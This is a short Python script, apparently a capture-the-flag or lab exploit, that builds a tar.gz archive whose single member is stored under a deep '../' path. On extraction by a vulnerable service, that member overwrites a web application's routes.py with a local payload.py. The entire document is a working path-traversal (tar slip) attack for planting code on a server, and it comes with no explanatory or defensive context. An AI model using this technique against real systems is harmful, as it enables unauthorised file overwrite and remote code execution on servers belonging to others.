import tarfile

archive = tarfile.open("pasta.tar.gz", "w|gz")
archive.add("./payload.py", arcname="../../../../../../../../../app/application/blueprints/routes.py")
archive.list()
archive.close()

